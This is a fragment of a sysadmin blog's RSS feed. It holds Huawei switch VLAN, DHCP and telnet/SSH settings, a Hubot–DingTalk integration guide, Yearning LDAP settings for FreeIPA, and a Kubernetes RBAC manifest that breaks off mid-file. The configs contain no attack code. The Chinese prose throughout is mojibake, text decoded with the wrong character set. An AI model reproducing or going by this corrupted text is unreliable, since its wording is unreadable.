&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;port default vlan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;stp edged-port &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å…«lldp&#34;&gt;å…«ã€lldp&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lldp &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¹dhcp&#34;&gt;ä¹ã€dhcp&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip pool &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; gateway-list 10.8.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; network 10.8.0.0 mask 255.255.254.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; static-bind ip-address 10.8.0.4 mac-address 8005-88f1-fa62
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; dns-list 114.114.114.114
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;interface Vlanif11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;description&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; Ke hu duan
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ip address 10.8.0.1 255.255.254.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; dhcp &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; global
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;åtelnetå’Œssh&#34;&gt;åã€telnetå’Œssh&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dsa local-key-pair create
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet server &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;stelnet server &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh authentication-type default password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å®Œæˆäº†ä¸€å°æ ¸å¿ƒè®¾å¤‡çš„ç®€å•é…ç½®&lt;/p&gt;</description>
    </item>
    <item>
      <title>Huboté›†æˆä¼ä¸šé’‰é’‰</title>
      <link>https://rendoumi.com/posts/20230301-hubot_dingding/</link>
      <pubDate>Wed, 01 Mar 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230301-hubot_dingding/</guid>
      <description>&lt;p&gt;æ¢äº†å…¬å¸ï¼Œç°åœ¨çš„å…¬å¸ç”¨çš„æ˜¯é’‰é’‰ï¼Œä¸æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œé‚£ä¹ˆ hubot å°±å¾—æ”¹æ¥å…¥é’‰é’‰äº†&lt;/p&gt;
&lt;p&gt;å‰æ–‡å›é¡¾ï¼š&lt;a href=&#34;../20211222-hubot_wechat/&#34;&gt;Huboté›†æˆä¼ä¸šå¾®ä¿¡+jenkins+ansible&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸æ˜ç™½çš„å¯ä»¥å…ˆçœ‹é‚£ä¸€ç¯‡ï¼Œé‚£ä¹ˆé¦–å…ˆçš„æ­¥éª¤æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·è¦å»é’‰é’‰å¼€æ”¾å¹³å°ï¼Œç”¨ç®¡ç†å‘˜ç™»å½•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://open.dingtalk.com/&#34;&gt;https://open.dingtalk.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç™»é™†åï¼Œç‚¹å‡»åº”ç”¨å¼€å‘&amp;ndash;&amp;gt;ä¼ä¸šåº”ç”¨å¼€å‘ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230301105804714&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230301-hubot_dingding/image-20230301105804714.png&#34;&gt;â€™&lt;/p&gt;
&lt;p&gt;ç„¶ååº”ç”¨å¼€å‘ï¼Œæœºå™¨äººï¼Œç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230301-hubot_dingding/image-20230301105903419.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å»ºå¥½åï¼Œç‚¹å‡»åº”ç”¨ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å‡­è¯&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è®°å½•ä¸‹æ¥ &lt;strong&gt;AppSecret&lt;/strong&gt;ï¼Œä¹‹åè¦ç”¨åˆ°&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230301110516010&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230301-hubot_dingding/image-20230301110516010.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå†ç‚¹å‡»å¼€å‘ç®¡ç†ï¼Œè¿™é‡Œéœ€è¦ä½ æŠŠ hubot çš„æœåŠ¡å™¨åœ°å€ç»™å…¬å¸ƒå‡ºå»ï¼Œéœ€è¦æœ‰ä¸ªå…¬ç½‘åœ°å€&lt;/p&gt;
&lt;p&gt;å› ä¸ºhubotæ˜¯ç›‘å¬çš„8080ç«¯å£ï¼Œæ‰€ä»¥æ˜ å°„æ˜¯ xxxx.ip:80 &amp;ndash;&amp;gt; hubotip:8080&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨å‡ºå£ IP çš„åœ°æ–¹ , éœ€è¦åœ¨ hubot çš„æœåŠ¡å™¨ä¸Šï¼Œcurl &lt;a href=&#34;http://ipinfo.io&#34;&gt;http://ipinfo.io&lt;/a&gt;ï¼Œå¾—åˆ°åœ°å€ï¼Œç„¶åå¡«ä¸Šï¼ˆæˆ‘ä»¬çš„ ip éå¸¸ç‰¹æ®Šï¼Œæ¯ä¸€æ¬¡è®¿é—®éƒ½æœ‰å¯èƒ½ä¼šæ¢ä¸ªipï¼Œæ‰€ä»¥åªå¥½æŠŠæ•´æ®µå¡«å†™è¿›å»ï¼Œè€Œä¸”æŠŠå…¬ç½‘æ˜ å°„ipä¹Ÿå¡«è¿›å»ï¼‰&lt;/p&gt;
&lt;p&gt;æ¶ˆæ¯æ¥æ”¶åœ°å€å¡«ä¸Šæ˜ å°„åçš„åœ°å€ï¼š&lt;code&gt;https://bot.rendoumi.com/hubot/dingtalk/message/&lt;/code&gt;ï¼ˆç”¨ä¸ç”¨nginxåŠ è¯ä¹¦å˜httpséšå…·ä½“æƒ…å†µå®šï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230301105958063&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230301-hubot_dingding/image-20230301105958063.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå»hubotå®‰è£…dingtalkæ’ä»¶ï¼Œåœ¨hubotå®‰è£…æ ¹ç›®å½•è¿è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install hubot-dingtalk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;HUBOT_DINGTALK_AUTH_TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sign
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;HUBOT_DINGTALK_SECRET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;xxxxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;HUBOT_DINGTALK_MODE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bin/hubot -a dingtalk
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬å»ç”¨æµè§ˆå™¨è®¿é—® &lt;code&gt;https://bot.rendoumi.com/hubot/dingtalk/message/&lt;/code&gt;ï¼Œä¼šè¿”å›è¿™ä¸ª&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230301132914868&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230301-hubot_dingding/image-20230301132914868.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±å¯ä»¥äº†ã€‚è‡³äºæŠŠ hubot åšæˆæœåŠ¡ï¼Œå°±å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« ï¼ŒæŠŠjenkinså’Œansibleéƒ½åŠ ä¸Šï¼Œåšä¸€ä¸ªå¥½ç”¨çš„æœºå™¨äººã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>yearningé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯</title>
      <link>https://rendoumi.com/posts/20230228-freeipa_yearning/</link>
      <pubDate>Tue, 28 Feb 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230228-freeipa_yearning/</guid>
      <description>&lt;p&gt;æ¥ä¸Šä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥æ•°æ®åº“ä¸Šçº¿è½¯ä»¶Yearning.&lt;/p&gt;
&lt;p&gt;å…ˆä¸‹ç»“è®ºï¼šåŒæ ·å­˜åœ¨å…ˆæœ‰ Yearning è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™æ¬¡è¦å‘½äº†ï¼Œå› ä¸º Yearning ä¸æ”¯æŒ LDAP è®¤è¯æ–¹å¼ç”¨æˆ·ä¸å·²æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ï¼æ‰€ä»¥ï¼Œç­‰äºldapæ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ï¼Œè·Ÿè€ç”¨æˆ·çš„é‚®ç®±ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯ä¸ª Newbeeï¼Œæ²¡æœ‰æƒé™ï¼Œéœ€è¦é‡æ–°èµ‹æƒã€‚æ¯”è¾ƒéº»çƒ¦ï¼å¸Œæœ›ä¹‹åèƒ½prä¿®æ”¹ä¸€ä¸‹ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;è¿æ¥å±æ€§å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ldapåœ°å€ï¼šfreeipa.bybon.cn:389
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAPç®¡ç†å‘˜DNï¼šuid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;manager,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bybon,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAPç®¡ç†å‘˜å¯†ç ï¼šxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAP_Search Filterï¼š&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;objectclass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;inetorgperson&lt;span class=&#34;o&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;memberOf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;confluence-users,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;groups,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bybon,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cn&lt;span class=&#34;o&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%s&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAP_SCBASEï¼šcn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,cn&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;accounts,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bybon,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LDAPç”¨æˆ·å±æ€§ï¼š&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;real_name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;displayName&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;mail&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;department&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;æŠ€æœ¯ä¸­å¿ƒ&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;LDAP_Search Filter æŒ‡æœç´¢ç”¨æˆ·æ—¶æ‰€ç”¨çš„filterï¼Œè¿™é‡Œå·äº†ä¸ªæ‡’ï¼ŒæŒ‰é“ç†åº”è¯¥æ˜¯ç‹¬ç«‹å»ºä¸€ä¸ªç»„yearning-usersï¼Œæ‡’å¾—å¹²äº†ï¼Œå¤ç”¨confluence-userså¥½äº†ã€‚adminç»„æ›´æ‡’å¾—å»ºï¼Œå¿…é¡»ç”¨freeipaçš„adminsç»„&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LDAP_SCBASE æŒ‡æœç´¢ç”¨æˆ·çš„BASE DN&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LDAPç”¨æˆ·å±æ€§æŒ‡yearningä¸­çš„å±æ€§ä¸ldapå±æ€§ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œdepartmentæ˜¯æ²¡æœ‰å¯¹åº”çš„ï¼Œä¹Ÿæ²¡æœ‰äººä¼šæ²¡äº‹å¹²å»ºä¸€ä¸ªå»å§ã€‚&lt;/p&gt;
&lt;p&gt;æˆªå›¾å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230228114517030&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230228-freeipa_yearning/image-20230228114517030.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesä¸­ç”¨æˆ·rbacçš„å»ºç«‹</title>
      <link>https://rendoumi.com/posts/20230222-kubernetes_rbac/</link>
      <pubDate>Wed, 22 Feb 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230222-kubernetes_rbac/</guid>
      <description>&lt;p&gt;k8sé‡Œé¢å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç»™ç‰¹å®šæƒé™ï¼Œå†åšrolebindingçš„è¿‡ç¨‹ï¼Œç»™ä¸ªæ ‡å‡†çš„å»ºç«‹jenkins-adminçš„ç”¨æˆ·çš„è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;ç®€å•æ¥è¯´ï¼Œä¸‰æ­¥ï¼ŒServiceAccout &amp;ndash;&amp;gt; Role &amp;ndash;&amp;gt; Rolebinding&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: ServiceAccount
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: jenkins-admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  namespace: devops-tools
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: rbac.authorization.k8s.io/v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: Role
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: jenkins
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  namespace: default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  labels:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;app.kubernetes.io/name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;jenkins&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rules:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- apiGroups: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resources: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pods&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  verbs: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;create&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;delete&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;list&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;patch&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;update&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;watch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- apiGroups: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resources: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pods/exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  verbs: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;create&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;delete&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;list&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;patch&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;update&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;watch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- apiGroups: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resources: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pods/log&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  verbs: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;list&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;watch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- apiGroups: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resources: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;secrets&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  verbs: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: rbac.authorization.k8s.io/v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: RoleBinding
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: jenkins-role-binding
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  namespace: default
